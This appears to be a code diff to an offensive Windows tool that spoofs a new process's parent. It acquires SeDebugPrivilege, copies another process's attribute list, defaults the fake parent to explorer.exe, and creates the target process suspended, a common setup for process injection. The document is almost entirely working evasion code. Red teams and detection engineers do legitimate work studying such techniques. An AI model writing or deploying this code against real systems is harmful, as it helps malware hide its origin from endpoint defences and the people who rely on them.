@@ -1,6 +1,10 @@
 #pragma once
+#include <windows.h>
+#include <tlhelp32.h>
+
 #include "Ridgway.h"
 #include "Restart.h"
+
 
 BOOL GetDebugPrivilege()
 {
@@ -37,14 +41,14 @@ BOOL GetDebugPrivilege()
 		for (DWORD x = 0; x < processTokenPrivs->PrivilegeCount; x++) {
 			const PLUID_AND_ATTRIBUTES runner = &processTokenPrivs->Privileges[x];
 			if ((runner->Luid.LowPart == privilegeLuid.LowPart) && (runner->Luid.HighPart == privilegeLuid.HighPart)) {
-				_tprintf(_T("[+] SeDebugPrivilege available!\n"));
+				DebugPrint(_T("[+] SeDebugPrivilege available!\n"));
 				seDebugAvailable = true;
 				break;
 			}
 		}
 
 		if (!seDebugAvailable) {
-			_tprintf(_T("[-] SeDebugPrivilege unavailable\n[-] Please run with Privileges!\n"));
+			DebugPrint(_T("[-] SeDebugPrivilege unavailable\n[-] Please run with Privileges!\n"));
 			CloseHandle(currentTokenHandle);
 			RelaunchSelf();
 			return FALSE;
@@ -77,7 +81,7 @@ HANDLE GetParentProcessHandle(int parentProcessId)
 	// TODO check if process is for current user and if not ask for debug priv
 	if (nullptr == parentProcessHandle)
 	{
-		_tprintf(TEXT("[*] Could not get handle, trying to get debug privilege to retry...\n"));
+		DebugPrint(TEXT("[*] Could not get handle, trying to get debug privilege to retry...\n"));
 		if (!GetDebugPrivilege())
 		{
 			return nullptr;
@@ -115,42 +119,73 @@ PPROC_THREAD_ATTRIBUTE_LIST GetParentAttributeList(HANDLE &parentProcessHandle)
 	return parentAttributeList;
 }
 
+int GetExplorerPid()
+{
+	WCHAR targetProcessName[] = L"explorer.exe";
+
+	auto snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
+
+	PROCESSENTRY32W entry;
+	entry.dwSize = sizeof entry;
+
+	if (!Process32FirstW(snap, &entry)) {
+		DisplayErrorMessage(TEXT("Error retrieving process snapshots"), GetLastError());
+		return 0;
+	}
+
+	do {
+		if ((std::wcscmp(entry.szExeFile, targetProcessName) == 0)) {
+			DebugPrint(TEXT("[+] Found parent PID: %d\n"), entry.th32ProcessID);
+			return entry.th32ProcessID;
+		}
+	} while (Process32NextW(snap, &entry)); 
+	return 0;
+}
+
 PROCESS_INFORMATION StartProcessSuspended(_TCHAR* processName, int parentProcessId)
 {
-
-	PROCESS_INFORMATION processInfo;
-	if (parentProcessId == 0)
+	auto processInfo = PROCESS_INFORMATION();
+	if (parentProcessId == -1)
 	{
-		_putts(TEXT("Invalid pid"));
-		return processInfo;
+		DebugPrint(TEXT("[*] Getting explorer PID as process ID\n"));
+		parentProcessId = GetExplorerPid();
+		DebugPrint(TEXT("[+] Got: %d\n"), parentProcessId);
 	}
 
 	// Get a handle on the parent process
-	HANDLE parentProcessHandle = GetParentProcessHandle(parentProcessId);
+	auto* parentProcessHandle = GetParentProcessHandle(parentProcessId);
 
-	if (nullptr == parentProcessHandle) { return processInfo; }
+	if (nullptr == parentProcessHandle)
+	{
+		DisplayErrorMessage(TEXT("Error getting handle on parent process"), GetLastError());
+		return processInfo;
+	}
+
+	DebugPrint((TEXT("[+] Opened handle to parent process\n")));
 
 	STARTUPINFOEX startupInfo = { sizeof(startupInfo) };
 
 	// Get the attribute list from the parent process
-	PPROC_THREAD_ATTRIBUTE_LIST parentAttributeList = GetParentAttributeList(parentProcessHandle);
+	auto* const parentAttributeList = GetParentAttributeList(parentProcessHandle);
 
 	if (parentAttributeList == nullptr)
 	{
 		DisplayErrorMessage(TEXT("Error getting attributes from parent process"), GetLastError());
 		return processInfo;
 	}
+	DebugPrint(TEXT("[+] Got parent attributes list: 0x%0p\n"), parentAttributeList);
+
 
 	// Set the startup info attribute list to the one set from the 'parent'.
 	startupInfo.lpAttributeList = parentAttributeList;
-
+	DebugPrint(TEXT("[*] Creating process %s spoofing PID of %d...\n"), processName, parentProcessId);
 	// Create the process
 	if (!CreateProcess(nullptr, processName, nullptr, nullptr, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, nullptr, nullptr, &startupInfo.StartupInfo, &processInfo))
 	{
 		DisplayErrorMessage(TEXT("CreateProcess error"), GetLastError());
 		return processInfo;
 	}
-	_tprintf(TEXT("[+] Process created: %d\n"), processInfo.dwProcessId);
+	DebugPrint(TEXT("Process created: %d\n"), processInfo.dwProcessId);
 
 	// Cleanup
 	DeleteProcThreadAttributeList(parentAttributeList);
